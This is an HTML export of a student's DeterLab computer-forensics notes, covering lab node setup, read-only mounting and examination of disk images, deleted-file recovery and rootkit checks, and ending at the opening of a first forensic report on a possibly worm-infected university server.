<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<!-- 2018-05-29 Tue 09:05 -->
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Deterlab notes Forensic Report Act 1</title>
<meta name="generator" content="Org mode" />
<meta name="author" content="John Herrlin John Herrlin John Herrlin John Herrlin" />
<style type="text/css">
 <!--/*--><![CDATA[/*><!--*/
  .title  { text-align: center;
             margin-bottom: .2em; }
  .subtitle { text-align: center;
              font-size: medium;
              font-weight: bold;
              margin-top:0; }
  .todo   { font-family: monospace; color: red; }
  .done   { font-family: monospace; color: green; }
  .priority { font-family: monospace; color: orange; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #ccc;
    box-shadow: 3px 3px 3px #eee;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: visible;
    padding-top: 1.2em;
  }
  pre.src:before {
    display: none;
    position: absolute;
    background-color: white;
    top: -10px;
    right: 10px;
    padding: 3px;
    border: 1px solid black;
  }
  pre.src:hover:before { display: inline;}
  /* Languages per Org manual */
  pre.src-asymptote:before { content: 'Asymptote'; }
  pre.src-awk:before { content: 'Awk'; }
  pre.src-C:before { content: 'C'; }
  /* pre.src-C++ doesn't work in CSS */
  pre.src-clojure:before { content: 'Clojure'; }
  pre.src-css:before { content: 'CSS'; }
  pre.src-D:before { content: 'D'; }
  pre.src-ditaa:before { content: 'ditaa'; }
  pre.src-dot:before { content: 'Graphviz'; }
  pre.src-calc:before { content: 'Emacs Calc'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-fortran:before { content: 'Fortran'; }
  pre.src-gnuplot:before { content: 'gnuplot'; }
  pre.src-haskell:before { content: 'Haskell'; }
  pre.src-hledger:before { content: 'hledger'; }
  pre.src-java:before { content: 'Java'; }
  pre.src-js:before { content: 'Javascript'; }
  pre.src-latex:before { content: 'LaTeX'; }
  pre.src-ledger:before { content: 'Ledger'; }
  pre.src-lisp:before { content: 'Lisp'; }
  pre.src-lilypond:before { content: 'Lilypond'; }
  pre.src-lua:before { content: 'Lua'; }
  pre.src-matlab:before { content: 'MATLAB'; }
  pre.src-mscgen:before { content: 'Mscgen'; }
  pre.src-ocaml:before { content: 'Objective Caml'; }
  pre.src-octave:before { content: 'Octave'; }
  pre.src-org:before { content: 'Org mode'; }
  pre.src-oz:before { content: 'OZ'; }
  pre.src-plantuml:before { content: 'Plantuml'; }
  pre.src-processing:before { content: 'Processing.js'; }
  pre.src-python:before { content: 'Python'; }
  pre.src-R:before { content: 'R'; }
  pre.src-ruby:before { content: 'Ruby'; }
  pre.src-sass:before { content: 'Sass'; }
  pre.src-scheme:before { content: 'Scheme'; }
  pre.src-screen:before { content: 'Gnu Screen'; }
  pre.src-sed:before { content: 'Sed'; }
  pre.src-sh:before { content: 'shell'; }
  pre.src-sql:before { content: 'SQL'; }
  pre.src-sqlite:before { content: 'SQLite'; }
  /* additional languages in org.el's org-babel-load-languages alist */
  pre.src-forth:before { content: 'Forth'; }
  pre.src-io:before { content: 'IO'; }
  pre.src-J:before { content: 'J'; }
  pre.src-makefile:before { content: 'Makefile'; }
  pre.src-maxima:before { content: 'Maxima'; }
  pre.src-perl:before { content: 'Perl'; }
  pre.src-picolisp:before { content: 'Pico Lisp'; }
  pre.src-scala:before { content: 'Scala'; }
  pre.src-shell:before { content: 'Shell Script'; }
  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
  /* additional language identifiers per "defun org-babel-execute"
       in ob-*.el */
  pre.src-cpp:before  { content: 'C++'; }
  pre.src-abc:before  { content: 'ABC'; }
  pre.src-coq:before  { content: 'Coq'; }
  pre.src-groovy:before  { content: 'Groovy'; }
  /* additional language identifiers from org-babel-shell-names in
     ob-shell.el: ob-shell is the only babel language using a lambda to put
     the execution function name together. */
  pre.src-bash:before  { content: 'bash'; }
  pre.src-csh:before  { content: 'csh'; }
  pre.src-ash:before  { content: 'ash'; }
  pre.src-dash:before  { content: 'dash'; }
  pre.src-ksh:before  { content: 'ksh'; }
  pre.src-mksh:before  { content: 'mksh'; }
  pre.src-posh:before  { content: 'posh'; }
  /* Additional Emacs modes also supported by the LaTeX listings package */
  pre.src-ada:before { content: 'Ada'; }
  pre.src-asm:before { content: 'Assembler'; }
  pre.src-caml:before { content: 'Caml'; }
  pre.src-delphi:before { content: 'Delphi'; }
  pre.src-html:before { content: 'HTML'; }
  pre.src-idl:before { content: 'IDL'; }
  pre.src-mercury:before { content: 'Mercury'; }
  pre.src-metapost:before { content: 'MetaPost'; }
  pre.src-modula-2:before { content: 'Modula-2'; }
  pre.src-pascal:before { content: 'Pascal'; }
  pre.src-ps:before { content: 'PostScript'; }
  pre.src-prolog:before { content: 'Prolog'; }
  pre.src-simula:before { content: 'Simula'; }
  pre.src-tcl:before { content: 'tcl'; }
  pre.src-tex:before { content: 'TeX'; }
  pre.src-plain-tex:before { content: 'Plain TeX'; }
  pre.src-verilog:before { content: 'Verilog'; }
  pre.src-vhdl:before { content: 'VHDL'; }
  pre.src-xml:before { content: 'XML'; }
  pre.src-nxml:before { content: 'XML'; }
  /* add a generic configuration mode; LaTeX export needs an additional
     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
  pre.src-conf:before { content: 'Configuration File'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.org-right  { text-align: center;  }
  th.org-left   { text-align: center;   }
  th.org-center { text-align: center; }
  td.org-right  { text-align: right;  }
  td.org-left   { text-align: left;   }
  td.org-center { text-align: center; }
  dt { font-weight: bold; }
  .footpara { display: inline; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  .org-svg { width: 90%; }
  /*]]>*/-->
</style>
<script type="text/javascript">
/*
@licstart  The following is the entire license notice for the
JavaScript code in this tag.

Copyright (C) 2012-2018 Free Software Foundation, Inc.

The JavaScript code in this tag is free software: you can
redistribute it and/or modify it under the terms of the GNU
General Public License (GNU GPL) as published by the Free Software
Foundation, either version 3 of the License, or (at your option)
any later version.  The code is distributed WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.

As additional permission under GNU GPL version 3 section 7, you
may distribute non-source (e.g., minimized or compacted) forms of
that code without the copy of the GNU GPL normally required by
section 4, provided you include this license notice and a URL
through which recipients can access the Corresponding Source.


@licend  The above is the entire license notice
for the JavaScript code in this tag.
*/
<!--/*--><![CDATA[/*><!--*/
 function CodeHighlightOn(elem, id)
 {
   var target = document.getElementById(id);
   if(null != target) {
     elem.cacheClassElem = elem.className;
     elem.cacheClassTarget = target.className;
     target.className = "code-highlighted";
     elem.className   = "code-highlighted";
   }
 }
 function CodeHighlightOff(elem, id)
 {
   var target = document.getElementById(id);
   if(elem.cacheClassElem)
     elem.className = elem.cacheClassElem;
   if(elem.cacheClassTarget)
     target.className = elem.cacheClassTarget;
 }
/*]]>*///-->
</script>
</head>
<body>
<div id="content">
<h1 class="title">Deterlab notes Forensic Report Act 1</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#org4386219">1. Assignment environment preparations</a>
<ul>
<li><a href="#org266467a">1.1. SSH</a></li>
<li><a href="#orgb8fda75">1.2. Start an environment</a></li>
<li><a href="#org5775077">1.3. Swapping</a>
<ul>
<li><a href="#org7bbae47">1.3.1. In</a></li>
<li><a href="#org86b4534">1.3.2. Out</a></li>
</ul>
</li>
<li><a href="#org6e6a02b">1.4. Joining an ongoing session</a></li>
<li><a href="#orga50339e">1.5. Useful</a>
<ul>
<li><a href="#org0cfdf22">1.5.1. Show node state</a></li>
<li><a href="#org0aab4ef">1.5.2. List all the files belonging to us, OPTIONAL</a></li>
<li><a href="#org9398ee7">1.5.3. Install Emacs 25.1 on Ubuntu 10.04, OPTIONAL</a></li>
<li><a href="#org4bda87c">1.5.4. <code>~/.profile</code>, OPTIONAL</a></li>
</ul>
</li>
<li><a href="#orga499078">1.6. Removing the environment</a></li>
<li><a href="#org532727c">1.7. Dumps</a></li>
</ul>
</li>
<li><a href="#orge6bceaf">2. Assignment tools preparation</a>
<ul>
<li><a href="#org1141a5e">2.1. Download an image</a></li>
<li><a href="#org0e598cc">2.2. Examin the image.</a></li>
<li><a href="#orgf755ef1">2.3. Mount a loop image.</a></li>
<li><a href="#org00d06dc">2.4. Search for deleted files on Ext2.</a></li>
<li><a href="#org2ea1c9c">2.5. Umount a loop device.</a></li>
<li><a href="#orge1dbf4e">2.6. Strings</a></li>
<li><a href="#org53582f6">2.7. Check for rootkits</a>
<ul>
<li><a href="#orgb79fa91">2.7.1. Install <code>chkrootkit</code></a></li>
<li><a href="#org3247bf5">2.7.2. Usage</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#orgfe60bcb">3. Forensic Report Act 1: The University Server</a>
<ul>
<li><a href="#org8c935fc">3.1. Executive summary</a></li>
<li><a href="#orgda427a6">3.2. Methodology</a>
<ul>
<li><a href="#orgb71386f">3.2.1. Download image</a></li>
<li><a href="#org5fb4442">3.2.2. Examin the image.</a></li>
<li><a href="#orgaee5839">3.2.3. Mount a loop image.</a></li>
<li><a href="#orgb8f4f2f">3.2.4. Get operating system</a></li>
<li><a href="#org64b45c7">3.2.5. Get time zone</a></li>
<li><a href="#orgff43266">3.2.6. Look for users</a></li>
<li><a href="#orgb376612">3.2.7. Users bash history</a></li>
<li><a href="#org73127e4">3.2.8. Look at Kevins music</a></li>
<li><a href="#org849b9fa">3.2.9. Look for log files</a></li>
<li><a href="#orgdb07fa0">3.2.10. Look for tmp files</a></li>
<li><a href="#org38c019a">3.2.11. Check for rootkits</a></li>
<li><a href="#orgf5c375a">3.2.12. Search for deleted files on Ext2.</a></li>
</ul>
</li>
<li><a href="#orgf807809">3.3. Report findings</a></li>
<li><a href="#org07c7474">3.4. Conclusion</a></li>
<li><a href="#org813956e">3.5. Glossary</a></li>
</ul>
</li>
<li><a href="#orgad7bc65">4. Forensic Report Act 2: The Missing Numbers</a>
<ul>
<li><a href="#org682d380">4.1. Executive summary</a></li>
<li><a href="#org6551d4d">4.2. Methodology</a>
<ul>
<li><a href="#org4030a94">4.2.1. Download image</a></li>
<li><a href="#orge5040c6">4.2.2. Examin the image.</a></li>
<li><a href="#org205ef15">4.2.3. Mount a loop image.</a></li>
<li><a href="#org168bbda">4.2.4. Get operating system</a></li>
<li><a href="#org1433d7e">4.2.5. Get time zone</a></li>
<li><a href="#orgde2df65">4.2.6. Look at /</a></li>
<li><a href="#org6d15b31">4.2.7. Look into <code>secrets</code></a></li>
<li><a href="#orgfe929f7">4.2.8. Look for users</a></li>
<li><a href="#orgd57b508">4.2.9. Look for groups</a></li>
<li><a href="#org6e723a0">4.2.10. Look at lastlog</a></li>
<li><a href="#org7257c9b">4.2.11. Hosts</a></li>
<li><a href="#org1056346">4.2.12. Freds account</a></li>
<li><a href="#org08ef2b6">4.2.13. Mikes account</a></li>
<li><a href="#orgd8bc193">4.2.14. Janes account</a></li>
<li><a href="#org18e6693">4.2.15. Jakes account</a></li>
<li><a href="#orgce52825">4.2.16. Root account</a></li>
<li><a href="#org5a40087">4.2.17. Look for the IP provided.</a></li>
<li><a href="#org3b29b07">4.2.18. Look for log files</a></li>
<li><a href="#org57249cd">4.2.19. Motd</a></li>
<li><a href="#orgab0c33b">4.2.20. John The Ripper</a></li>
<li><a href="#org99cb1f9">4.2.21. Check for rootkits</a></li>
<li><a href="#org0f550f3">4.2.22. Search for deleted files on Ext2.</a></li>
<li><a href="#orgec58637">4.2.23. Look for tmp files</a></li>
</ul>
</li>
<li><a href="#orgfe6dc9d">4.3. Report findings</a></li>
<li><a href="#orgc7ff045">4.4. Recommended steps before returning to production</a></li>
<li><a href="#org4187bd1">4.5. Time estimation</a></li>
<li><a href="#org1ade031">4.6. Conclusion</a></li>
</ul>
</li>
<li><a href="#org2802d47">5. Forensic Report Act 3: The Wealthy Individual</a>
<ul>
<li><a href="#org62268cd">5.1. Executive summary</a></li>
<li><a href="#orgfb61452">5.2. Methodology</a>
<ul>
<li><a href="#orgae00818">5.2.1. Download image</a></li>
<li><a href="#org0c434b3">5.2.2. Examin the image.</a></li>
<li><a href="#org440ba8a">5.2.3. Mount a root partition.</a></li>
<li><a href="#org42574af">5.2.4. Mount swap 1</a></li>
<li><a href="#org9d5ff8e">5.2.5. Mount swap 2</a></li>
<li><a href="#org9146c2b">5.2.6. Get operating system</a></li>
<li><a href="#org8d4a6c9">5.2.7. Get time zone</a></li>
<li><a href="#org4e3970f">5.2.8. Look at /</a></li>
<li><a href="#org7cf5886">5.2.9. Look for users</a></li>
<li><a href="#org6febfb9">5.2.10. Look for groups</a></li>
<li><a href="#org7061f29">5.2.11. Look at lastlog</a></li>
<li><a href="#org901b3c8">5.2.12. Hosts</a></li>
<li><a href="#org92f99de">5.2.13. Rich account</a></li>
<li><a href="#org74beff2">5.2.14. Jeeves account</a></li>
<li><a href="#org4973010">5.2.15. Gardener account</a></li>
<li><a href="#org41b3894">5.2.16. Chef account</a></li>
<li><a href="#orgaea4377">5.2.17. ubuntu account</a></li>
<li><a href="#orge83383a">5.2.18. Root account</a></li>
<li><a href="#org4f53189">5.2.19. Look for log files</a></li>
<li><a href="#org3e2e1c1">5.2.20. Look for binary files</a></li>
<li><a href="#org7c37304">5.2.21. Motd</a></li>
<li><a href="#orgd3f3824">5.2.22. John The Ripper</a></li>
<li><a href="#org223d943">5.2.23. Check for rootkits</a></li>
<li><a href="#org90dfd5b">5.2.24. Search for deleted files on Ext2.</a></li>
<li><a href="#org01a2ac3">5.2.25. Look for tmp files</a></li>
<li><a href="#org5333d75">5.2.26. Look for keys</a></li>
<li><a href="#org0ea001e">5.2.27. Key1</a></li>
<li><a href="#org49ea3b5">5.2.28. Key2</a></li>
<li><a href="#org3956596">5.2.29. Key3</a></li>
<li><a href="#org9f4adb8">5.2.30. Key4</a></li>
<li><a href="#orgb1eb80f">5.2.31. Key5</a></li>
<li><a href="#orgd7268aa">5.2.32. Key{6,7,8}</a></li>
<li><a href="#org9e2de20">5.2.33. Look for keys</a></li>
<li><a href="#orga8edc6a">5.2.34. History</a></li>
</ul>
</li>
<li><a href="#orgebe1ce7">5.3. Report findings</a></li>
<li><a href="#orga8f3177">5.4. Time estimation</a></li>
<li><a href="#org8639153">5.5. Before going to production</a></li>
</ul>
</li>
</ul>
</div>
</div>
<p>
<a href="http://docs.deterlab.net/">Deterlabs Docs</a>
</p>

<p>
<a href="http://docs.deterlab.net/core/deterlab-commands/">Deterlabs Commands Docs</a>
</p>

<p>
<a href="https://www.isi.deterlab.net/file.php?file=/groups/LnuITSec/LnuITSec/284&amp;mid=284">Assignment</a>
</p>

<div id="outline-container-org4386219" class="outline-2">
<h2 id="org4386219"><span class="section-number-2">1</span> Assignment environment preparations</h2>
<div class="outline-text-2" id="text-1">
</div>
<div id="outline-container-org266467a" class="outline-3">
<h3 id="org266467a"><span class="section-number-3">1.1</span> SSH</h3>
<div class="outline-text-3" id="text-1-1">
<p>
Generate a new key for the service.
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh-keygen -t rsa -b 4096 -f ~/.ssh/deterlab
</pre>
</div>

<p>
Add the <b>~/.ssh/deterlab.pub</b> key to your Deterlab profile using
the web page. You find a link to the left in a yellow box.
</p>

<p>
SSH have a config file that makes it easier to connect to services.
If <code>~/.ssh/config</code> does not exists then create it and add:
</p>

<div class="org-src-container">
<pre class="src src-text">Host deterlab
     HostName users.isi.deterlab.net
     User &lt;YOUR USERNAME&gt;
     Protocol 2
     IdentityFile ~/.ssh/deterlab
     StrictHostKeyChecking no
     PubkeyAuthentication yes
     PasswordAuthentication no
</pre>
</div>

<p>
To connect to the Deterlab &ldquo;Bastion&rdquo; environment use:
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh deterlab
</pre>
</div>
</div>
</div>


<div id="outline-container-orgb8fda75" class="outline-3">
<h3 id="orgb8fda75"><span class="section-number-3">1.2</span> Start an environment</h3>
<div class="outline-text-3" id="text-1-2">
<p>
Create a new environment named your username. The second command waits for the
environment to be build and then enters it by SSH. When everything is finished you will
get a question about adding a RSA fingerprint, say <code>yes</code>. <b>The second command can
take some time to finish!</b> You should now see something like: <code>lnuitsaa@workbench:~$</code>,
then you are on the node. The creation of a node only needs to be done once.
You then swap in/out of that node, look at <a href="#org81f402b">1.3</a>.
</p>

<div class="org-src-container">
<pre class="src src-sh">startexp -i -p LnuITSec -e $<span style="color: #DFAF8F;">USER</span> /share/education/ComputerForensics_UCLA/forensics.ns
expwait -e LnuITSec,$<span style="color: #DFAF8F;">USER</span> active &amp;&amp; ssh $(<span style="color: #CC9393;">node_list</span> -e LnuITSec,$<span style="color: #DFAF8F;">USER</span>)
</pre>
</div>
</div>
</div>


<div id="outline-container-org5775077" class="outline-3">
<h3 id="org5775077"><span class="section-number-3">1.3</span> Swapping</h3>
<div class="outline-text-3" id="text-1-3">
<p>
<a id="org81f402b"></a>
</p>

<p>
Swapping in and out of environments. The environment have a default time of 4 hours
before it swaps out, i think this only happens if nothing is going on on the node. Then
you need to swap in again.
</p>
</div>

<div id="outline-container-org7bbae47" class="outline-4">
<h4 id="org7bbae47"><span class="section-number-4">1.3.1</span> In</h4>
<div class="outline-text-4" id="text-1-3-1">
<p>
Set the node in swap state and join it as soon as it is ready. The environment take
some time to start, at least some minutes. Use this command on the &ldquo;Bastion&rdquo;.
</p>

<div class="org-src-container">
<pre class="src src-sh">swapexp -e LnuITSec,$<span style="color: #DFAF8F;">USER</span><span style="color: #F0DFAF; font-weight: bold;"> in</span> &amp;&amp; expwait -e LnuITSec,$<span style="color: #DFAF8F;">USER</span> active &amp;&amp; ssh $(<span style="color: #CC9393;">node_list</span> -e LnuITSec,$<span style="color: #DFAF8F;">USER</span>)
</pre>
</div>
</div>
</div>

<div id="outline-container-org86b4534" class="outline-4">
<h4 id="org86b4534"><span class="section-number-4">1.3.2</span> Out</h4>
<div class="outline-text-4" id="text-1-3-2">
<p>
When you are done working for the day, swap out and the resources can be used by
someone else. This command should be used on the &ldquo;Bastion&rdquo;.
</p>

<div class="org-src-container">
<pre class="src src-sh">swapexp -w -e LnuITSec,$<span style="color: #DFAF8F;">USER</span> out
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-org6e6a02b" class="outline-3">
<h3 id="org6e6a02b"><span class="section-number-3">1.4</span> Joining an ongoing session</h3>
<div class="outline-text-3" id="text-1-4">
<p>
If the session is active you can join it with:
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh $(<span style="color: #CC9393;">node_list</span> -e LnuITSec,$<span style="color: #DFAF8F;">USER</span>)
</pre>
</div>
</div>
</div>


<div id="outline-container-orga50339e" class="outline-3">
<h3 id="orga50339e"><span class="section-number-3">1.5</span> Useful</h3>
<div class="outline-text-3" id="text-1-5">
</div>
<div id="outline-container-org0cfdf22" class="outline-4">
<h4 id="org0cfdf22"><span class="section-number-4">1.5.1</span> Show node state</h4>
<div class="outline-text-4" id="text-1-5-1">
<p>
Show the state of a node.
</p>

<div class="org-src-container">
<pre class="src src-sh">expinfo -n -e LnuITSec,$<span style="color: #DFAF8F;">USER</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-org0aab4ef" class="outline-4">
<h4 id="org0aab4ef"><span class="section-number-4">1.5.2</span> List all the files belonging to us, OPTIONAL</h4>
<div class="outline-text-4" id="text-1-5-2">
<div class="org-src-container">
<pre class="src src-sh">ls -lR /proj/LnuITSec/
</pre>
</div>
</div>
</div>


<div id="outline-container-org9398ee7" class="outline-4">
<h4 id="org9398ee7"><span class="section-number-4">1.5.3</span> Install Emacs 25.1 on Ubuntu 10.04, OPTIONAL</h4>
<div class="outline-text-4" id="text-1-5-3">
<p>
Download and transfer the <b>emacs-25.1.tar.xz</b> to the node. The node doesn&rsquo;t have
internet access so use <code>scp</code> or <code>sftp</code> from your local computer.
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo apt-get install build-essential checkinstall
sudo apt-get install libncurses5
sudo apt-get install libncurses-dev
sudo apt-get build-dep emacs23
tar xf emacs-25.1.tar.xz
<span style="color: #DCDCCC; font-weight: bold;">cd</span> emacs-25.1
./configure --without-x
make
</pre>
</div>

<p>
Add to <code>~/.profile</code>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">alias</span> <span style="color: #DFAF8F;">emacs25</span>=<span style="color: #CC9393;">'~/./emacs-25.1/src/emacs'</span>
</pre>
</div>

<p>
You can now use Emacs 25 by:
</p>

<div class="org-src-container">
<pre class="src src-sh">emacs25
</pre>
</div>
</div>
</div>

<div id="outline-container-org4bda87c" class="outline-4">
<h4 id="org4bda87c"><span class="section-number-4">1.5.4</span> <code>~/.profile</code>, OPTIONAL</h4>
<div class="outline-text-4" id="text-1-5-4">
<p>
Useful alias.
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">alias</span> <span style="color: #DFAF8F;">l</span>=<span style="color: #CC9393;">'ls -lhaF'</span>
<span style="color: #DCDCCC; font-weight: bold;">alias</span> <span style="color: #DFAF8F;">rm</span>=<span style="color: #CC9393;">'rm -i'</span>
<span style="color: #DCDCCC; font-weight: bold;">alias</span> <span style="color: #DFAF8F;">mv</span>=<span style="color: #CC9393;">'mv -i'</span>
<span style="color: #DCDCCC; font-weight: bold;">alias</span> <span style="color: #DFAF8F;">join</span>=<span style="color: #CC9393;">'ssh $(</span><span style="color: #CC9393;">node_list</span><span style="color: #CC9393;"> -e LnuITSec,$USER)'</span>
<span style="color: #DCDCCC; font-weight: bold;">alias</span> <span style="color: #DFAF8F;">swapout</span>=<span style="color: #CC9393;">'swapexp -w -e LnuITSec,$USER out'</span>
<span style="color: #DCDCCC; font-weight: bold;">alias</span> <span style="color: #DFAF8F;">swapin</span>=<span style="color: #CC9393;">'yes | swapexp -e LnuITSec,$USER in &amp;&amp; expwait -e LnuITSec,$USER active &amp;&amp; ssh $(</span><span style="color: #CC9393;">node_list</span><span style="color: #CC9393;"> -e LnuITSec,$USER)'</span>
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-orga499078" class="outline-3">
<h3 id="orga499078"><span class="section-number-3">1.6</span> Removing the environment</h3>
<div class="outline-text-3" id="text-1-6">
<p>
<b>This will destroy the environment completely!</b> All* data that are on the node will be
deleted. Use this when you are done with <b>all</b> of the assignments.
</p>

<div class="org-src-container">
<pre class="src src-sh">endexp -w -e LnuITSec,$<span style="color: #DFAF8F;">USER</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-org532727c" class="outline-3">
<h3 id="org532727c"><span class="section-number-3">1.7</span> Dumps</h3>
<div class="outline-text-3" id="text-1-7">
<p>
<a href="https://staff.washington.edu/dittrich/misc/forensics/">https://staff.washington.edu/dittrich/misc/forensics/</a>
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo grep -ir breakin /var/log/*
sudo grep -ir attempt /var/log/*
sudo grep -ir login /var/log/*
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-orge6bceaf" class="outline-2">
<h2 id="orge6bceaf"><span class="section-number-2">2</span> Assignment tools preparation</h2>
<div class="outline-text-2" id="text-2">
</div>

<div id="outline-container-org1141a5e" class="outline-3">
<h3 id="org1141a5e"><span class="section-number-3">2.1</span> Download an image</h3>
<div class="outline-text-3" id="text-2-1">
<p>
Download the act1 assignemnt and check sha hash.
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> /images
sudo ./loadimage.sh act1.img
sha256sum act1.img
</pre>
</div>
</div>
</div>

<div id="outline-container-org0e598cc" class="outline-3">
<h3 id="org0e598cc"><span class="section-number-3">2.2</span> Examin the image.</h3>
<div class="outline-text-3" id="text-2-2">
<p>
Examin the <code>/images/sda1</code> image that was loaded.
</p>

<div class="org-src-container">
<pre class="src src-sh">file /images/act1.img
fdisk -lu /images/act1.img
</pre>
</div>

<p>
Here is a table with the offsets that is found on the disk.
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />

<col  class="org-right" />
</colgroup>
<tbody>
<tr>
<td class="org-left">Parition</td>
<td class="org-right">Start</td>
<td class="org-right">512 Start</td>
</tr>

<tr>
<td class="org-left">act1.img1</td>
<td class="org-right">63</td>
<td class="org-right">32256</td>
</tr>

<tr>
<td class="org-left">act1.img2</td>
<td class="org-right">3887730</td>
<td class="org-right">1990517760</td>
</tr>

<tr>
<td class="org-left">act1.img5</td>
<td class="org-right">3887793</td>
<td class="org-right">1990550016</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-orgf755ef1" class="outline-3">
<h3 id="orgf755ef1"><span class="section-number-3">2.3</span> Mount a loop image.</h3>
<div class="outline-text-3" id="text-2-3">
<p>
Mount the first &ldquo;loop0&rdquo; to <code>/images/sda1</code>, this is the file system to examin.
</p>


<div class="org-src-container">
<pre class="src src-sh">sudo losetup /dev/loop0 /images/act1.img -o 32256
sudo mount /dev/loop0 /images/sda1 -t ext2 -o ro
df -Th | grep /images/sda1
ls -la /images/sda1
</pre>
</div>
</div>
</div>

<div id="outline-container-org00d06dc" class="outline-3">
<h3 id="org00d06dc"><span class="section-number-3">2.4</span> Search for deleted files on Ext2.</h3>
<div class="outline-text-3" id="text-2-4">
<p>
Searching for deleted files on a Ext2 disk.
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo e2undel -d /dev/loop0 -s /images/recovered -a -tw
</pre>
</div>
</div>
</div>

<div id="outline-container-org2ea1c9c" class="outline-3">
<h3 id="org2ea1c9c"><span class="section-number-3">2.5</span> Umount a loop device.</h3>
<div class="outline-text-3" id="text-2-5">
<p>
Umount sda1 and loop0
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo umount /images/sda1
sudo losetup -d /dev/loop0
</pre>
</div>
</div>
</div>

<div id="outline-container-orge1dbf4e" class="outline-3">
<h3 id="orge1dbf4e"><span class="section-number-3">2.6</span> Strings</h3>
<div class="outline-text-3" id="text-2-6">
<p>
<code>strings</code>, &ldquo;print the strings of printable characters in files.&rdquo;
</p>

<div class="org-src-container">
<pre class="src src-sh">strings /var/log/wtmp
</pre>
</div>
</div>
</div>

<div id="outline-container-org53582f6" class="outline-3">
<h3 id="org53582f6"><span class="section-number-3">2.7</span> Check for rootkits</h3>
<div class="outline-text-3" id="text-2-7">
</div>
<div id="outline-container-orgb79fa91" class="outline-4">
<h4 id="orgb79fa91"><span class="section-number-4">2.7.1</span> Install <code>chkrootkit</code></h4>
<div class="outline-text-4" id="text-2-7-1">
<p>
In our case the application is already extracted.
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> /images/chkrootkit-0.47
ls -la
</pre>
</div>
</div>
</div>

<div id="outline-container-org3247bf5" class="outline-4">
<h4 id="org3247bf5"><span class="section-number-4">2.7.2</span> Usage</h4>
<div class="outline-text-4" id="text-2-7-2">
<div class="org-src-container">
<pre class="src src-sh">
chkrootkit -r root_directory (where root_directory is the mounted disk image)
</pre>
</div>
</div>
</div>
</div>
</div>

<div id="outline-container-orgfe60bcb" class="outline-2">
<h2 id="orgfe60bcb"><span class="section-number-2">3</span> Forensic Report Act 1: The University Server</h2>
<div class="outline-text-2" id="text-3">
</div>

<div id="outline-container-org8c935fc" class="outline-3">
<h3 id="org8c935fc"><span class="section-number-3">3.1</span> Executive summary</h3>
<div class="outline-text-3" id="text-3-1">
<p>
Bob, a professor of Computer Science at some big school in The
City. He got an angry email from the Network Operations Center
(NOC) at the University saying that his lab&rsquo;s server was infected
with a worm &#x2013; the NOC determined this because of a huge spike in
Internet traffic which occurred at 4 in the morning. He immediately
shut it down and brought it in to be imaged. He doesn&rsquo;t think it
was infected, but the University wants independent confirmation
before they will put it back online. Bob told you that the machine
was just being installed; there were hardly any files on it except
for his own account &rsquo;bob&rsquo; and some student accounts &rsquo;eric&rsquo;,
&rsquo;kevin&rsquo;, &rsquo;peter&rsquo; and &rsquo;takeda&rsquo;.
</p>
</div>
</div>

<div id="outline-container-orgda427a6" class="outline-3">
<h3 id="orgda427a6"><span class="section-number-3">3.2</span> Methodology</h3>
<div class="outline-text-3" id="text-3-2">
</div>
<div id="outline-container-orgb71386f" class="outline-4">
